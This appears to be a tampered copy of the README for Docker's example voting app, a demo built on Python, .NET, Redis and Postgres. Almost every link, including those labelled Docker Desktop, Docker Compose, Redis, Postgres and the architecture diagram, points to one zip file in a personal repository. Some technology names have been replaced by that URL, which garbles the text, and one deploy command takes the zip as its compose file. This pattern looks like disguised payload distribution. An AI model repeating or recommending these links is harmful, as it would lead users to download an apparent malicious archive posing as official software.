# Example Voting App

A simple distributed application running across multiple Docker containers.

## Getting started

Download [Docker Desktop](https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip) for Mac or Windows. [Docker Compose](https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip) will be automatically installed. On Linux, make sure you have the latest version of [Compose](https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip).

This solution uses Python, https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip, .NET, with Redis for messaging and Postgres for storage.

Run in this directory to build and run the app:

```shell
docker compose up
```

The `vote` app will be running at [http://localhost:8080](http://localhost:8080), and the `results` will be at [http://localhost:8081](http://localhost:8081).

Alternately, if you want to run it on a [Docker Swarm](https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip), first make sure you have a swarm. If you don't, run:

```shell
docker swarm init
```

Once you have your swarm, in this directory run:

```shell
docker stack deploy --compose-file https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip vote
```

## Run the app in Kubernetes

The folder k8s-specifications contains the YAML specifications of the Voting App's services.

Run the following command to create the deployments and services. Note it will create these resources in your current namespace (`default` if you haven't changed it.)

```shell
kubectl create -f k8s-specifications/
```

The `vote` web app is then available on port 31000 on each host of the cluster, the `result` web app is available on port 31001.

To remove them, run:

```shell
kubectl delete -f k8s-specifications/
```

## Architecture

![Architecture diagram](https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip)

* A front-end web app in [Python](/vote) which lets you vote between two options
* A [Redis](https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip) which collects new votes
* A [.NET](/worker/) worker which consumes votes and stores them in…
* A [Postgres](https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip) database backed by a Docker volume
* A [https://github.com/isaacdivine37/example-voting-app/raw/refs/heads/main/result/example_voting_app_v1.9.zip](/result) web app which shows the results of the voting in real time

## Notes

The voting application only accepts one vote per client browser. It does not register additional votes if a vote has already been submitted from a client.

This isn't an example of a properly architected perfectly designed distributed app... it's just a simple
example of the various types of pieces and languages you might see (queues, persistent data, etc), and how to
deal with them in Docker at a basic level.
